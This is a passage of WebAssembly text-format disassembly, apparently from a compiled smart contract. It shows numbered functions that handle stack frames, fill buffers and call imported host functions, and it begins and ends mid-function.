        br_if 1 (;@1;)
        local.get 3
        i32.const 24
        i32.add
        local.get 2
        i32.add
        i64.const 2
        i64.store
        local.get 2
        i32.const 8
        i32.add
        local.set 2
        br 0 (;@2;)
      end
    end
    local.get 3
    i32.const 40
    i32.add
    local.get 3
    i32.const 24
    i32.add
    local.get 3
    i32.const 24
    i32.add
    i32.const 16
    i32.add
    local.get 3
    i32.const 8
    i32.add
    local.get 3
    i32.const 8
    i32.add
    i32.const 16
    i32.add
    call 83
    i32.const 0
    local.get 3
    i32.load offset=60
    local.tee 2
    local.get 3
    i32.load offset=56
    local.tee 1
    i32.sub
    local.tee 6
    local.get 6
    local.get 2
    i32.gt_u
    select
    local.set 2
    local.get 3
    i32.load offset=48
    local.get 1
    i32.const 3
    i32.shl
    local.tee 6
    i32.add
    local.set 1
    local.get 3
    i32.load offset=40
    local.get 6
    i32.add
    local.set 6
    block ;; label = @1
      loop ;; label = @2
        local.get 2
        i32.eqz
        br_if 1 (;@1;)
        local.get 6
        local.get 1
        local.get 4
        call 97
        i64.store
        local.get 2
        i32.const -1
        i32.add
        local.set 2
        local.get 1
        i32.const 8
        i32.add
        local.set 1
        local.get 6
        i32.const 8
        i32.add
        local.set 6
        br 0 (;@2;)
      end
    end
    local.get 4
    local.get 0
    i32.const 1048664
    local.get 4
    local.get 3
    i32.const 24
    i32.add
    i32.const 2
    call 87
    call 60
    local.get 3
    i32.const 64
    i32.add
    global.set 0
  )
  (func (;42;) (type 17) (param i32 i32 i32 i32 i32 i32)
    (local i32 i32 i64 i64 i64 i64)
    global.get 0
    i32.const 112
    i32.sub
    local.tee 6
    global.set 0
    local.get 1
    local.get 0
    i32.const 8
    i32.add
    local.tee 7
    call 96
    local.set 8
    local.get 2
    local.get 7
    call 96
    local.set 9
    local.get 3
    local.get 7
    call 96
    local.set 10
    local.get 7
    local.get 4
    call 38
    local.set 11
    local.get 6
    local.get 5
    local.get 7
    call 96
    i64.store offset=40
    local.get 6
    local.get 11
    i64.store offset=32
    local.get 6
    local.get 10
    i64.store offset=24
    local.get 6
    local.get 9
    i64.store offset=16
    local.get 6
    local.get 8
    i64.store offset=8
    i32.const 0
    local.set 5
    block ;; label = @1
      loop ;; label = @2
        local.get 5
        i32.const 40
        i32.eq
        br_if 1 (;@1;)
        local.get 6
        i32.const 48
        i32.add
        local.get 5
        i32.add
        i64.const 2
        i64.store
        local.get 5
        i32.const 8
        i32.add
        local.set 5
        br 0 (;@2;)
      end
    end
    local.get 6
    i32.const 88
    i32.add
    local.get 6
    i32.const 48
    i32.add
    local.get 6
    i32.const 48
    i32.add
    i32.const 40
    i32.add
    local.get 6
    i32.const 8
    i32.add
    local.get 6
    i32.const 8
    i32.add
    i32.const 40
    i32.add
    call 83
    i32.const 0
    local.get 6
    i32.load offset=108
    local.tee 5
    local.get 6
    i32.load offset=104
    local.tee 4
    i32.sub
    local.tee 3
    local.get 3
    local.get 5
    i32.gt_u
    select
    local.set 5
    local.get 6
    i32.load offset=96
    local.get 4
    i32.const 3
    i32.shl
    local.tee 3
    i32.add
    local.set 4
    local.get 6
    i32.load offset=88
    local.get 3
    i32.add
    local.set 3
    block ;; label = @1
      loop ;; label = @2
        local.get 5
        i32.eqz
        br_if 1 (;@1;)
        local.get 3
        local.get 4
        local.get 7
        call 97
        i64.store
        local.get 5
        i32.const -1
        i32.add
        local.set 5
        local.get 4
        i32.const 8
        i32.add
        local.set 4
        local.get 3
        i32.const 8
        i32.add
        local.set 3
        br 0 (;@2;)
      end
    end
    local.get 7
    local.get 0
    i32.const 1048672
    local.get 7
    local.get 6
    i32.const 48
    i32.add
    i32.const 5
    call 87
    call 60
    local.get 6
    i32.const 112
    i32.add
    global.set 0
  )
  (func (;43;) (type 7) (param i32 i32 i32)
    (local i32)
    global.get 0
    i32.const 16
    i32.sub
    local.tee 3
    global.set 0
    local.get 3
    local.get 1
    local.get 2
    i64.load
    call 95
    i64.store offset=8
    local.get 0
    local.get 1
    local.get 3
    i32.const 8
    i32.add
    call 51
    local.get 3
    i32.const 16
    i32.add
    global.set 0
  )
  (func (;44;) (type 8) (param i32 i32) (result i64)
    local.get 1
    local.get 1
    local.get 0
    call 47
    call 93
  )
  (func (;45;) (type 7) (param i32 i32 i32)
    (local i32 i64 i64)
    global.get 0
    i32.const 16
    i32.sub
    local.tee 3
    global.set 0
    local.get 3
    local.get 2
    local.get 1
    call 75
    block ;; label = @1
      block ;; label = @2
        local.get 3
        i32.load
        br_if 0 (;@2;)
        local.get 3
        local.get 3
        i64.load offset=8
        i64.store
        i64.const 0
        local.set 4
        local.get 1
        local.get 3
        i32.const 1
        call 87
        local.set 5
        br 1 (;@1;)
      end
      i64.const 1
      local.set 4
      call 125
      local.set 5
    end
    local.get 0
    local.get 4
    i64.store
    local.get 0
    local.get 5
    i64.store offset=8
    local.get 3
    i32.const 16
    i32.add
    global.set 0
  )
  (func (;46;) (type 7) (param i32 i32 i32)
    (local i32 i64)
    global.get 0
    i32.const 16
    i32.sub
    local.tee 3
    global.set 0
    local.get 3
    local.get 1
    local.get 2
    call 52
    local.get 3
    i64.load offset=8
    local.set 4
    local.get 0
    local.get 3
    i64.load
    i64.store
    local.get 0
    local.get 4
    i64.store offset=8
    local.get 3
    i32.const 16
    i32.add
    global.set 0
  )
  (func (;47;) (type 8) (param i32 i32) (result i64)
    (local i32 i64)
    global.get 0
    i32.const 16
    i32.sub
    local.tee 2
    global.set 0
    local.get 2
    local.get 0
    local.get 1
    call 48
    block ;; label = @1
      local.get 2
      i64.load
      i64.const 1
      i64.ne
      br_if 0 (;@1;)
      unreachable
    end
    local.get 2
    i64.load offset=8
    local.set 3
    local.get 2
    i32.const 16
    i32.add
    global.set 0
    local.get 3
  )
  (func (;48;) (type 7) (param i32 i32 i32)
    (local i32 i64 i64 i64 i64 i64 i64 i64)
    global.get 0
    i32.const 64
    i32.sub
    local.tee 3
    global.set 0
    local.get 3
    i32.const 8
    i32.add
    local.get 1
    local.get 2
    call 46
    i64.const 1
    local.set 4
    block ;; label = @1
      local.get 3
      i32.load offset=8
      br_if 0 (;@1;)
      local.get 3
      i64.load offset=16
      local.set 5
      local.get 3
      i32.const 8
      i32.add
      local.get 2
      i32.const 32
      i32.add
      local.get 1
      call 74
      local.get 3
      i32.load offset=8
      br_if 0 (;@1;)
      local.get 3
      i64.load offset=16
      local.set 6
      local.get 3
      i32.const 8
      i32.add
      local.get 2
      i32.const 40
      i32.add
      local.get 1
      call 74
      local.get 3
      i32.load offset=8
      br_if 0 (;@1;)
      local.get 3
      i64.load offset=16
      local.set 7
      local.get 3
      i32.const 8
      i32.add
      local.get 2
      i32.const 48
      i32.add
      local.get 1
      call 74
      local.get 3
      i32.load offset=8
      br_if 0 (;@1;)
      local.get 3
      i64.load offset=16
      local.set 8
      local.get 3
      i32.const 8
      i32.add
      local.get 1
      local.get 2
      i32.const 16
      i32.add
      call 46
      local.get 3
      i32.load offset=8
      br_if 0 (;@1;)
      local.get 3
      i64.load offset=16
      local.set 9
      local.get 3
      i32.const 8
      i32.add
      local.get 2
      i32.const 56
      i32.add
      local.get 1
      call 74
      local.get 3
      i32.load offset=8
      br_if 0 (;@1;)
      local.get 3
      i64.load offset=16
      local.set 10
      local.get 3
      i32.const 8
      i32.add
      local.get 2
      i32.const 64
      i32.add
      local.get 1
      call 74
      local.get 3
      i32.load offset=8
      br_if 0 (;@1;)
      local.get 3
      local.get 3
      i64.load offset=16
      i64.store offset=56
      local.get 3
      local.get 10
      i64.store offset=48
      local.get 3
      local.get 9
      i64.store offset=40
      local.get 3
      local.get 8
      i64.store offset=32
      local.get 3
      local.get 7
      i64.store offset=24
      local.get 3
      local.get 6
      i64.store offset=16
      local.get 3
      local.get 5
      i64.store offset=8
      local.get 0
      local.get 1
      i32.const 1048960
      i32.const 7
      local.get 3
      i32.const 8
      i32.add
      i32.const 7
      call 88
      i64.store offset=8
      i64.const 0
      local.set 4
    end
    local.get 0
    local.get 4
    i64.store
    local.get 3
    i32.const 64
    i32.add
    global.set 0
  )
  (func (;49;) (type 7) (param i32 i32 i32)
    (local i32 i64)
    global.get 0
    i32.const 16
    i32.sub
    local.tee 3
    global.set 0
    local.get 3
    local.get 2
    local.get 1
    call 74
    i64.const 1
    local.set 4
    block ;; label = @1
      local.get 3
      i32.load
      br_if 0 (;@1;)
      local.get 3
      local.get 3
      i64.load offset=8
      i64.store
      local.get 0
      local.get 1
      i32.const 1049064
      i32.const 1
      local.get 3
      i32.const 1
      call 88
      i64.store offset=8
      i64.const 0
      local.set 4
    end
    local.get 0
    local.get 4
    i64.store
    local.get 3
    i32.const 16
    i32.add
    global.set 0
  )
  (func (;50;) (type 0) (param i32 i32) (result i32)
    local.get 1
    i32.const 1049016
    i32.const 15
    call 133
  )
  (func (;51;) (type 7) (param i32 i32 i32)
    (local i32 i32 i64 i64 i64 i64 i64 i64 i64 i64 i64)
    global.get 0
    i32.const 96
    i32.sub
    local.tee 3
    global.set 0
    i32.const 0
    local.set 4
    block ;; label = @1
      loop ;; label = @2
        local.get 4
        i32.const 56
        i32.eq
        br_if 1 (;@1;)
        local.get 3
        i32.const 8
        i32.add
        local.get 4
        i32.add
        i64.const 2
        i64.store
        local.get 4
        i32.const 8
        i32.add
        local.set 4
        br 0 (;@2;)
      end
    end
    i64.const 1
    local.set 5
    block ;; label = @1
      local.get 2
      i64.load
      local.tee 6
      i64.const 255
      i64.and
      i64.const 76
      i64.ne
      br_if 0 (;@1;)
      local.get 1
      local.get 6
      i32.const 1048960
      i32.const 7
      local.get 3
      i32.const 8
      i32.add
      i32.const 7
      call 89
      drop
      local.get 3
      i32.const 64
      i32.add
      local.get 1
      local.get 3
      i32.const 8
      i32.add
      call 33
      i64.const 1
      local.set 5
      local.get 3
      i64.load offset=64
      i64.const 1
      i64.eq
      br_if 0 (;@1;)
      local.get 3
      i64.load offset=88
      local.set 6
      local.get 3
      i64.load offset=80
      local.set 7
      local.get 3
      i32.const 64
      i32.add
      local.get 3
      i32.const 16
      i32.add
      local.get 1
      call 76
      local.get 3
      i32.load offset=64
      br_if 0 (;@1;)
      local.get 3
      i64.load offset=72
      local.set 8
      local.get 3
      i32.const 64
      i32.add
      local.get 3
      i32.const 24
      i32.add
      local.get 1
      call 76
      local.get 3
      i32.load offset=64
      br_if 0 (;@1;)
      local.get 3
      i64.load offset=72
      local.set 9
      local.get 3
      i32.const 64
      i32.add
      local.get 3
      i32.const 32
      i32.add
      local.get 1
      call 76
      local.get 3
      i32.load offset=64
      br_if 0 (;@1;)
      local.get 3
      i64.load offset=72
      local.set 10
      local.get 3
      i32.const 64
      i32.add
      local.get 1
      local.get 3
      i32.const 40
      i32.add
      call 33
      i64.const 1
      local.set 5
      local.get 3
      i64.load offset=64
      i64.const 1
      i64.eq
      br_if 0 (;@1;)
      local.get 3
      i64.load offset=88
      local.set 11
      local.get 3
      i64.load offset=80
      local.set 12
      local.get 3
      i32.const 64
      i32.add
      local.get 3
      i32.const 48
      i32.add
      local.get 1
      call 76
      local.get 3
      i32.load offset=64
      br_if 0 (;@1;)
      local.get 3
      i64.load offset=72
      local.set 13
      local.get 3
      i32.const 64
      i32.add
      local.get 3
      i32.const 56
      i32.add
      local.get 1
      call 76
      local.get 3
      i32.load offset=64
      br_if 0 (;@1;)
      local.get 3
      i64.load offset=72
      local.set 5
      local.get 0
      local.get 12
      i64.store offset=32
      local.get 0
      local.get 7
      i64.store offset=16
      local.get 0
      local.get 5
      i64.store offset=80
      local.get 0
      local.get 13
      i64.store offset=72
      local.get 0
      local.get 10
      i64.store offset=64
      local.get 0
      local.get 9
      i64.store offset=56
      local.get 0
      local.get 8
      i64.store offset=48
      local.get 0
      local.get 11
      i64.store offset=40
      local.get 0
      local.get 6
      i64.store offset=24
      i64.const 0
      local.set 5
    end
    local.get 0
    i64.const 0
    i64.store offset=8
    local.get 0
    local.get 5
    i64.store
    local.get 3
    i32.const 96
    i32.add
    global.set 0
  )
  (func (;52;) (type 7) (param i32 i32 i32)
    (local i32 i64 i64)
    global.get 0
    i32.const 16
    i32.sub
    local.tee 3
    global.set 0
    local.get 3
    local.get 2
    i64.load
    local.tee 4
    local.get 2
    i64.load offset=8
    local.tee 5
    call 126
    block ;; label = @1
      block ;; label = @2
        local.get 3
        i32.load
        br_if 0 (;@2;)
        local.get 3
        i64.load offset=8
        local.set 4
        br 1 (;@1;)
      end
      local.get 1
      local.get 5
      local.get 4
      call 94
      local.set 4
    end
    local.get 0
    i64.const 0
    i64.store
    local.get 0
    local.get 4
    i64.store offset=8
    local.get 3
    i32.const 16
    i32.add
    global.set 0
  )
  (func (;53;) (type 5) (param i64) (result i64)
    call 80
    local.get 0
    call 30
  )
  (func (;54;) (type 5) (param i64) (result i64)
    call 80
    local.get 0
    call 26
  )
  (func (;55;) (type 14) (param i64 i64 i64 i64 i64 i64 i64 i64) (result i64)
    call 80
    local.get 0
    local.get 1
    local.get 2
    local.get 3
    local.get 4
    local.get 5
    local.get 6
    local.get 7
    call 35
  )
  (func (;56;) (type 4) (param i64 i64 i64 i64) (result i64)
    call 80
    local.get 0
    local.get 1
    local.get 2
    local.get 3
    call 32
  )
  (func (;57;) (type 2) (param i64 i64) (result i64)
    call 80
    local.get 0
    local.get 1
    call 28
  )
  (func (;58;) (type 18) (param i32 i32 i32 i32 i64)
    (local i32)
    global.get 0
    i32.const 64
    i32.sub
    local.tee 5
    global.set 0
    local.get 5
    local.get 1
    local.get 2
    i64.load
    local.get 3
    i64.load
    local.get 4
    call 118
    i64.store offset=8
    local.get 5
    i32.const 16
    i32.add
    local.get 1
    local.get 5
    i32.const 8
    i32.add
    call 59
    block ;; label = @1
      local.get 5
      i64.load offset=16
      i64.const 1
      i64.ne
      br_if 0 (;@1;)
      i32.const 1049104
      i32.const 43
      local.get 5
      i32.const 63
      i32.add
      i32.const 1049088
      i32.const 1049072
      call 135
      unreachable
    end
    local.get 5
    i64.load offset=32
    local.set 4
    local.get 0
    local.get 5
    i64.load offset=40
    i64.store offset=8
    local.get 0
    local.get 4
    i64.store
    local.get 5
    i32.const 64
    i32.add
    global.set 0
  )
  (func (;59;) (type 7) (param i32 i32 i32)
    (local i64 i64)
    block ;; label = @1
      block ;; label = @2
        block ;; label = @3
          block ;; label = @4
            local.get 2
            i64.load
            local.tee 3
            i32.wrap_i64
            i32.const 255
            i32.and
            local.tee 2
            i32.const 69
            i32.eq
            br_if 0 (;@4;)
            local.get 2
            i32.const 11
            i32.ne
            br_if 2 (;@2;)
            local.get 0
            i32.const 16
            i32.add
            local.get 3
            call 124
            br 1 (;@3;)
          end
          local.get 1
          local.get 3
          call 105
          local.set 4
          local.get 1
          local.get 3
          call 106
          local.set 3
          local.get 0
          local.get 4
          i64.store offset=24
          local.get 0
          local.get 3
          i64.store offset=16
        end
        i64.const 0
        local.set 3
        br 1 (;@1;)
      end
      local.get 0
      call 125
      i64.store offset=8
      i64.const 1
      local.set 3
    end
    local.get 0
    local.get 3
    i64.store
  )
  (func (;60;) (type 9) (param i32 i32 i32 i64)
    (local i32)
    global.get 0
    i32.const 16
    i32.sub
    local.tee 4
    global.set 0
    block ;; label = @1
      local.get 0
      local.get 1
      i64.load
      local.get 2
      i64.load
      local.get 3
      call 118
      i64.const 255
      i64.and
      i64.const 2
      i64.eq
      br_if 0 (;@1;)
      i32.const 1049104
      i32.const 43
      local.get 4
      i32.const 15
      i32.add
      i32.const 1049088
      i32.const 1049072
      call 135
      unreachable
    end
    local.get 4
    i32.const 16
    i32.add
    global.set 0
  )
  (func (;61;) (type 19) (param i32)
    unreachable
  )
  (func (;62;) (type 19) (param i32))
  (func (;63;) (type 20) (param i32) (result i32)
    local.get 0
    call 113
    call 121
  )
  (func (;64;) (type 21) (param i32) (result i64)
    local.get 0
    call 117
  )
  (func (;65;) (type 21) (param i32) (result i64)
    local.get 0
    i64.load
  )
  (func (;66;) (type 22) (param i32 i32 i32) (result i64)
    (local i32 i64)
    global.get 0
    i32.const 32
    i32.sub
    local.tee 3
    global.set 0
    local.get 3
    local.get 2
    i32.store offset=12
    local.get 3
    local.get 1
    i32.store offset=8
    local.get 3
    i32.const 16
    i32.add
    local.get 0
    local.get 3
    i32.const 8
    i32.add
    call 67
    block ;; label = @1
      local.get 3
      i64.load offset=16
      i64.const 1
      i64.ne
      br_if 0 (;@1;)
      unreachable
    end
    local.get 3
    i64.load offset=24
    local.set 4
    local.get 3
    i32.const 32
    i32.add
    global.set 0
    local.get 4
  )
  (func (;67;) (type 7) (param i32 i32 i32)
    (local i32)
    global.get 0
    i32.const 16
    i32.sub
    local.tee 3
    global.set 0
    local.get 3
    local.get 2
    i64.load align=4
    i64.store offset=8 align=4
    local.get 0
    local.get 1
    local.get 3
    i32.const 8
    i32.add
    call 79
    local.get 3
    i32.const 16
    i32.add
    global.set 0
  )
  (func (;68;) (type 8) (param i32 i32) (result i64)
    local.get 1
    i64.load
  )
  (func (;69;) (type 23) (param i32 i64 i64) (result i64)
    local.get 0
    local.get 1
    local.get 2
    call 109
  )
  (func (;70;) (type 24) (param i32 i64 i64) (result i32)
    local.get 0
    local.get 1
    local.get 2
    call 110
    call 122
  )
  (func (;71;) (type 8) (param i32 i32) (result i64)
    (local i32 i64)
    global.get 0
    i32.const 16
    i32.sub
    local.tee 2
    global.set 0
    local.get 2
    local.get 0
    local.get 1
    call 78
    block ;; label = @1
      local.get 2
      i64.load
      i64.const 1
      i64.ne
      br_if 0 (;@1;)
      unreachable
    end
    local.get 2
    i64.load offset=8
    local.set 3
    local.get 2
    i32.const 16
    i32.add
    global.set 0
    local.get 3
  )
  (func (;72;) (type 16) (param i32 i32 i32 i32 i32)
    (local i32 i64 i64)
    global.get 0
    i32.const 64
    i32.sub
    local.tee 5
    global.set 0
    local.get 1
    i64.load
    local.set 6
    local.get 2
    i64.load
    local.set 7
    local.get 5
    local.get 0
    i32.const 8
    i32.add
    local.tee 2
    local.get 3
    call 71
    i64.store offset=16
    local.get 5
    local.get 7
    i64.store offset=8
    local.get 5
    local.get 6
    i64.store
    local.get 5
    local.get 4
    i64.load32_u
    i64.const 32
    i64.shl
    i64.const 4
    i64.or
    i64.store offset=24
    i32.const 0
    local.set 1
    loop ;; label = @1
      block ;; label = @2
        local.get 1
        i32.const 32
        i32.ne
        br_if 0 (;@2;)
        i32.const 0
        local.set 1
        block ;; label = @3
          loop ;; label = @4
            local.get 1
            i32.const 32
            i32.eq
            br_if 1 (;@3;)
            local.get 5
            i32.const 32
            i32.add
            local.get 1
            i32.add
            local.get 5
            local.get 1
            i32.add
            i64.load
            i64.store
            local.get 1
            i32.const 8
            i32.add
            local.set 1
            br 0 (;@4;)
          end
        end
        local.get 2
        local.get 0
        i32.const 1049152
        local.get 2
        local.get 5
        i32.const 32
        i32.add
        i32.const 4
        call 101
        call 60
        local.get 5
        i32.const 64
        i32.add
        global.set 0
        return
      end
      local.get 5
      i32.const 32
      i32.add
      local.get 1
      i32.add
      i64.const 2
      i64.store
      local.get 1
      i32.const 8
      i32.add
      local.set 1
      br 0 (;@1;)
    end
  )
  (func (;73;) (type 7) (param i32 i32 i32)
    (local i32)
    global.get 0
    i32.const 16
    i32.sub
    local.tee 3
    global.set 0
    local.get 3
    local.get 2
    i64.load
    i64.store offset=8
    local.get 1
    i32.const 8
    i32.add
    local.set 2
    local.get 0
    local.get 2
    local.get 1
    i32.const 1049160
    local.get 2
    local.get 3
    i32.const 8
    i32.add
    i32.const 1
    call 101
    call 58
    local.get 3
    i32.const 16
    i32.add
    global.set 0
  )
  (func (;74;) (type 7) (param i32 i32 i32)
    local.get 0
    i64.const 0
    i64.store
    local.get 0
    local.get 1
    i64.load
    i64.store offset=8
  )
  (func (;75;) (type 7) (param i32 i32 i32)
    local.get 0
    i64.const 0
    i64.store
    local.get 0
    local.get 1
    i64.load
    i64.store offset=8
  )
  (func (;76;) (type 7) (param i32 i32 i32)
    (local i64 i64)
    i64.const 1
    local.set 3
    block ;; label = @1
      local.get 1
      i64.load
      local.tee 4
      i64.const 255
      i64.and
      i64.const 77
      i64.ne
      br_if 0 (;@1;)
      local.get 0
      local.get 4
      i64.store offset=8
      i64.const 0
      local.set 3
    end
    local.get 0
    local.get 3
    i64.store
  )
  (func (;77;) (type 7) (param i32 i32 i32)
    (local i32 i64)
    global.get 0
    i32.const 16
    i32.sub
    local.tee 3
    global.set 0
    local.get 3
    local.get 1
    local.get 2
    call 67
    i64.const 1
    local.set 4
    block ;; label = @1
      local.get 3
      i32.load
      br_if 0 (;@1;)
      local.get 0
      local.get 3
      i64.load offset=8
      i64.store offset=8
      i64.const 0
      local.set 4
    end
    local.get 0
    local.get 4
    i64.store
    local.get 3
    i32.const 16
    i32.add
    global.set 0
  )
  (func (;78;) (type 7) (param i32 i32 i32)
    (local i32 i64)
    global.get 0
    i32.const 16
    i32.sub
    local.tee 3
    global.set 0
    local.get 3
    local.get 1
    local.get 2
    call 100
    local.get 3
    i64.load offset=8
    local.set 4
    local.get 0
    local.get 3
    i64.load
    i64.store
    local.get 0
    local.get 4
    i64.store offset=8
    local.get 3
    i32.const 16
    i32.add
    global.set 0
  )
  (func (;79;) (type 7) (param i32 i32 i32)
    (local i32 i32 i64)
    global.get 0
    i32.const 16
    i32.sub
    local.tee 3
    global.set 0
    local.get 3
    local.get 2
    i32.load
    local.tee 4
    local.get 2
    i32.load offset=4
    local.tee 2
    call 119
    block ;; label = @1
      block ;; label = @2
        local.get 3
        i32.load
        i32.const 1
        i32.ne
        br_if 0 (;@2;)
        local.get 1
        local.get 4
        local.get 2
        call 104
        local.set 5
        br 1 (;@1;)
      end
      local.get 3
      i64.load offset=8
      local.set 5
    end
    local.get 0
    i64.const 0
    i64.store
    local.get 0
    local.get 5
    i64.store offset=8
    local.get 3
    i32.const 16
    i32.add
    global.set 0
  )
  (func (;80;) (type 25))
  (func (;81;) (type 0) (param i32 i32) (result i32)
    local.get 1
    i32.const 1049168
    i32.const 15
    call 133
  )
  (func (;82;) (type 7) (param i32 i32 i32)
    local.get 0
    i64.const 0
    i64.store
    local.get 0
    local.get 2
    i64.load
    i64.store offset=8
  )
  (func (;83;) (type 16) (param i32 i32 i32 i32 i32)
    local.get 0
    i32.const 0
    i32.store offset=16
    local.get 0
    local.get 4
    i32.store offset=12
    local.get 0
    local.get 3
    i32.store offset=8
    local.get 0
    local.get 2
    i32.store offset=4
    local.get 0
    local.get 1
    i32.store
    local.get 0
    local.get 4
    local.get 3
    i32.sub
    i32.const 3
    i32.shr_u
    local.tee 4
    local.get 2
    local.get 1
    i32.sub
    i32.const 3
    i32.shr_u
    local.tee 3
    local.get 4
    local.get 3
    i32.lt_u
    select
    i32.store offset=20
  )
  (func (;84;) (type 7) (param i32 i32 i32)
    (local i64 i64)
    i64.const 1
    local.set 3
    block ;; label = @1
      local.get 2
      i64.load
      local.tee 4
      i64.const 255
      i64.and
      i64.const 77
      i64.ne
      br_if 0 (;@1;)
      local.get 0
      local.get 4
      i64.store offset=8
      i64.const 0
      local.set 3
    end
    local.get 0
    local.get 3
    i64.store
  )
  (func (;85;) (type 7) (param i32 i32 i32)
    (local i64 i64)
    i64.const 1
    local.set 3
    block ;; label = @1
      local.get 2
      i64.load
      local.tee 4
      i64.const 255
      i64.and
      i64.const 72
      i64.ne
      br_if 0 (;@1;)
      local.get 0
      local.get 4
      i64.store offset=8
      i64.const 0
      local.set 3
    end
    local.get 0
    local.get 3
    i64.store
  )
  (func (;86;) (type 7) (param i32 i32 i32)
    local.get 0
    i64.const 0
    i64.store
    local.get 0
    local.get 2
    i64.load offset=8
    i64.store offset=8
  )
  (func (;87;) (type 22) (param i32 i32 i32) (result i64)
    local.get 0
    local.get 1
    local.get 2
    call 101
  )
  (func (;88;) (type 26) (param i32 i32 i32 i32 i32) (result i64)
    local.get 0
    local.get 1
    local.get 2
    local.get 3
    local.get 4
    call 102
  )
  (func (;89;) (type 27) (param i32 i64 i32 i32 i32 i32) (result i64)
    local.get 0
    local.get 1
    local.get 2
    local.get 3
    local.get 4
    local.get 5
    call 103
  )
  (func (;90;) (type 28) (param i32 i64) (result i64)
    local.get 0
    local.get 1
    call 107
  )
  (func (;91;) (type 28) (param i32 i64) (result i64)
    local.get 0
    local.get 1
    call 108
  )
  (func (;92;) (type 29) (param i32 i64 i64 i64) (result i64)
    local.get 0
    local.get 1
    local.get 2
    local.get 3
    call 111
  )
  (func (;93;) (type 28) (param i32 i64) (result i64)
    local.get 0
    local.get 1
    call 112
  )
  (func (;94;) (type 23) (param i32 i64 i64) (result i64)
    local.get 0
    local.get 1
    local.get 2
    call 115
  )
  (func (;95;) (type 28) (param i32 i64) (result i64)
    local.get 0
    local.get 1
    call 116
  )
  (func (;96;) (type 8) (param i32 i32) (result i64)
    local.get 0
    i64.load
  )
  (func (;97;) (type 8) (param i32 i32) (result i64)
    local.get 0
    i64.load
  )
  (func (;98;) (type 8) (param i32 i32) (result i64)
    local.get 1
    local.get 0
    call 71
  )
  (func (;99;) (type 30) (param i32 i32)
    local.get 0
    i64.const 0
    i64.store
    local.get 0
    local.get 1
    i64.load
    i64.store offset=8
  )
  (func (;100;) (type 7) (param i32 i32 i32)
    (local i32 i64 i64)
    global.get 0
    i32.const 16
    i32.sub
    local.tee 3
    global.set 0
    local.get 3
    local.get 2
    i64.load
    local.tee 4
    local.get 2
    i64.load offset=8
    local.tee 5
    call 127
    block ;; label = @1
      block ;; label = @2
        local.get 3
        i32.load
        br_if 0 (;@2;)
        local.get 3
        i64.load offset=8
        local.set 4
        br 1 (;@1;)
      end
      local.get 1
      local.get 5
      local.get 4
      call 114
      local.set 4
    end
    local.get 0
    i64.const 0
    i64.store
    local.get 0
    local.get 4
    i64.store offset=8
    local.get 3
    i32.const 16
    i32.add
    global.set 0
  )
  (func (;101;) (type 22) (param i32 i32 i32) (result i64)
    local.get 1
    i64.extend_i32_u
    i64.const 32
    i64.shl
    i64.const 4
    i64.or
    local.get 2
    i64.extend_i32_u
    i64.const 32
    i64.shl
    i64.const 4
    i64.or
    call 0
  )
  (func (;102;) (type 26) (param i32 i32 i32 i32 i32) (result i64)
    block ;; label = @1
      local.get 2
      local.get 4
      i32.eq
      br_if 0 (;@1;)
      unreachable
    end
    local.get 1
    i64.extend_i32_u
    i64.const 32
    i64.shl
    i64.const 4
    i64.or
    local.get 3
    i64.extend_i32_u
    i64.const 32
    i64.shl
    i64.const 4
    i64.or
    local.get 2
    i64.extend_i32_u
    i64.const 32
    i64.shl
    i64.const 4
    i64.or
    call 1
  )
  (func (;103;) (type 27) (param i32 i64 i32 i32 i32 i32) (result i64)
    block ;; label = @1
      local.get 3
      local.get 5
      i32.eq
      br_if 0 (;@1;)
      unreachable
    end
    local.get 1
    local.get 2
    i64.extend_i32_u
    i64.const 32
    i64.shl
    i64.const 4
    i64.or
    local.get 4
    i64.extend_i32_u
    i64.const 32
    i64.shl
    i64.const 4
    i64.or
    local.get 3
    i64.extend_i32_u
    i64.const 32
    i64.shl
    i64.const 4
    i64.or
    call 2
  )
  (func (;104;) (type 22) (param i32 i32 i32) (result i64)
    local.get 1
    i64.extend_i32_u
    i64.const 32
    i64.shl
    i64.const 4
    i64.or
    local.get 2
    i64.extend_i32_u
    i64.const 32
    i64.shl
    i64.const 4
    i64.or
    call 3
  )
  (func (;105;) (type 28) (param i32 i64) (result i64)
    local.get 1
    call 4
  )
  (func (;106;) (type 28) (param i32 i64) (result i64)
    local.get 1
    call 5
  )
  (func (;107;) (type 28) (param i32 i64) (result i64)
    local.get 1
    call 6
  )
  (func (;108;) (type 28) (param i32 i64) (result i64)
    local.get 1
    call 7
  )
  (func (;109;) (type 23) (param i32 i64 i64) (result i64)
    local.get 1
    local.get 2
    call 8
  )
  (func (;110;) (type 23) (param i32 i64 i64) (result i64)
    local.get 1
    local.get 2
    call 9
  )
  (func (;111;) (type 29) (param i32 i64 i64 i64) (result i64)
    local.get 1
    local.get 2
    local.get 3
    call 10
  )
  (func (;112;) (type 28) (param i32 i64) (result i64)
    local.get 1
    call 11
  )
  (func (;113;) (type 21) (param i32) (result i64)
    call 12
  )
  (func (;114;) (type 23) (param i32 i64 i64) (result i64)
    local.get 1
    local.get 2
    call 13
  )
  (func (;115;) (type 23) (param i32 i64 i64) (result i64)
    local.get 1
    local.get 2
    call 14
  )
  (func (;116;) (type 28) (param i32 i64) (result i64)
    local.get 1
    call 15
  )
  (func (;117;) (type 21) (param i32) (result i64)
    call 16
  )
  (func (;118;) (type 29) (param i32 i64 i64 i64) (result i64)
    local.get 1
    local.get 2
    local.get 3
    call 17
  )
  (func (;119;) (type 7) (param i32 i32 i32)
    (local i32 i64)
    global.get 0
    i32.const 16
    i32.sub
    local.tee 3
    global.set 0
    block ;; label = @1
      block ;; label = @2
        local.get 2
        i32.const 9
        i32.gt_u
        br_if 0 (;@2;)
        i64.const 0
        local.set 4
        loop ;; label = @3
          block ;; label = @4
            local.get 2
            br_if 0 (;@4;)
            local.get 0
            i32.const 0
            i32.store
            local.get 0
            local.get 4
            i64.const 8
            i64.shl
            i64.const 14
            i64.or
            i64.store offset=8
            br 3 (;@1;)
          end
          local.get 3
          i32.const 8
          i32.add
          local.get 1
          i32.load8_u
          call 120
          block ;; label = @4
            local.get 3
            i32.load8_u offset=8
            i32.const 255
            i32.eq
            br_if 0 (;@4;)
            local.get 0
            local.get 3
            i64.load offset=8
            i64.store offset=4 align=4
            local.get 0
            i32.const 1
            i32.store
            br 3 (;@1;)
          end
          local.get 2
          i32.const -1
          i32.add
          local.set 2
          local.get 1
          i32.const 1
          i32.add
          local.set 1
          local.get 4
          i64.const 6
          i64.shl
          local.get 3
          i64.load8_u offset=9
          i64.or
          local.set 4
          br 0 (;@3;)
        end
      end
      local.get 0
      local.get 2
